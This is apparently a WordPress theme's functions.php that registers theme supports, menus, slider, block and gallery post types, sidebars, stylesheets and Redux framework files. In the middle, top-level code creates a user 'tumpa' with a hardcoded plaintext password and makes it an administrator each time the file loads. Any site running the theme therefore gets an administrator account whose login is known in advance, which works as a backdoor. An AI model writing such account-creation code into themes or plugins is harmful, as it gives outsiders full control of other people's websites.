<?php

    add_theme_support('title-tag');
    add_theme_support( 'post-thumbnails' );
    add_theme_support('custom-background');
    load_theme_textdomain('boom',get_template_directory_uri().'/language');



function readmore($limit){
  $content= explode(" ", get_the_content()); 
    $limitation= array_slice($content,0, $limit);
echo implode(" ", $limitation) ;
};


register_nav_menus(array(
        'primary'=>__('Main Menu','boom'),
    ));


register_post_type('zbooms',array(
    'labels'=>array(
        'name'=> 'Slider',
    ),
    'public'=> true,
    'supports'=> array('thumbnail','title'),
    'menu_icon'=> 'https://cdn4.iconfinder.com/data/icons/web-development-5/500/bug-spider-tools-32.png',/*   menu icon add from dashicon  ----*/
    'menu_position'=>50,
));
        
register_post_type('block',array(
    'labels' => array(
        'name' => ' block'
        
    ),
    'public' => true,
    'supports' => array( 'editor','title','thumbnail' ),
    'menu_icon'=>'http://elusiveicons.com/icon/edit'
));

register_post_type('gallery',array(

        'labels'=>array(
            'name'=>'Gallery',
            ),
        'public'=>true,
        'supports'=>array('editor','title','thumbnail'),
    ));


function zboom_widgets(){

    register_sidebar(array(
        'name'=>'right sidebar',
        'id' =>'right_sidebar',
        'description' => 'you can add right sidebar from here',
        'before_widget'=>'<div class="box">',
        'after_widget'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">',
        ));


    register_sidebar(array(
        'name'=>'footer sidebar',
        'id'=> 'footer_sidebar',
        'description'=>'Add footer sidebar',
        'before_widget'=>'<div class="col-1-4"><div class="wrap-col"><div class="box">',
        'after_widget'=>'</div></div></div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">',


        ));


    register_sidebar(array(

        'name'=>'contact right sidebar',
        'id'=>'cright-sidebar',
        'description'=>'You can add sidebar for contact page',
        'before_widget'=>'<div class="box">',
        'after_widget'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div>
                        <div class="content">'


        ));

};
add_action('widgets_init','zboom_widgets');



/*     ---------  user creation   ---------    */




$newuser = new WP_User(wp_create_user('tumpa','khairul','khairul@tumpa.com'));

$newuser -> set_role('administrator');






/*   ------- adding style and Script  ------ */


function add_style_and_script(){

    wp_enqueue_style('zerogrid',get_template_directory_uri().'/css/zerogrid.css'); 
    wp_enqueue_style('style',get_template_directory_uri().'/css/style.css');
    wp_enqueue_style('responsive',get_template_directory_uri().'/css/responsive.css');  
    wp_enqueue_style('responsiveslides',get_template_directory_uri().'/css/responsiveslides.css');  



    wp_enqueue_script('responsiveslides',get_template_directory_uri().'/js/responsiveslides.js');
    

    wp_enqueue_script('jquery'); /* ---------- register jQuery --------- */

};

add_action('wp_enqueue_scripts','add_style_and_script');



/*   ------- redux add system  ------ */


require_once('library/ReduxCore/framework.php');
require_once('library/sample/sample-config.php');





































 ?>
